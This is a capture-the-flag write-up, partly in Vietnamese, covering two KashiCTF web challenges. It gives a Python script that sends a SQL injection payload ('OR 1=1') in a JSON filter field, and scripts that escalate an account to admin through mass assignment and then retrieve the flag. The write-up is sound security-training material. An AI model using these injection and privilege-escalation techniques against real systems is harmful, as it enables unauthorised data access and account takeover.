# Web

## Corporate Life 1
### Payload
```python
import httpx

base_url = "http://kashictf.iitbhucybersec.in:65107/api"

payload = {"filter": "' OR 1=1 -- "}

response = httpx.post(base_url + "/list-v2", json=payload)

if response.status_code == 200:
    with open("output.txt", "w") as file:
        file.write(response.text)
    print("Response written to 'output.txt'")
else:
    print(f"Request failed with status code: {response.status_code}")
```


## SuperFastAPI

### Tìm endpoint
Dùng redoc để tìm tài liệu API:

```
http://kashictf.iitbhucybersec.in:35798/redoc
```

### Phát hiện các endpoint quan trọng:

- `/create/{username}` → Tạo tài khoản
- `/update/{username}` → Cập nhật thông tin tài khoản
- `/flag/{username}` → Lấy flag

Tạo tài khoản
Gửi request để tạo tài khoản của mình:

```python
import requests

username = "abc"
url = f"http://kashictf.iitbhucybersec.in:35798/create/{username}"
headers = {
    "Content-Type": "application/json"
}
data = {
    "fname": "John",
    "lname": "Doe",
    "email": "john@example.com",
    "gender": "male"
}

response = requests.post(url, headers=headers, json=data)
print(response.status_code, response.text)

```


Sửa role và lấy flag:

```python
import requests

username = "abc"
update_url = f"http://kashictf.iitbhucybersec.in:35798/update/{username}"
flag_url = f"http://kashictf.iitbhucybersec.in:35798/flag/{username}"

headers = {
    "Content-Type": "application/json"
}

update_data = {
    "role": "admin"
}

update_response = requests.put(update_url, headers=headers, json=update_data)
print("[+] Update Response:", update_response.status_code, update_response.text)

if update_response.status_code == 200:
    flag_response = requests.get(flag_url)
    print("[+] Flag:", flag_response.text)
else:
    print("[-] Error!")

```

Kết quả:
```
KashiCTF{m455_4551gnm3n7_ftw_LBBJ23ZSV}
```
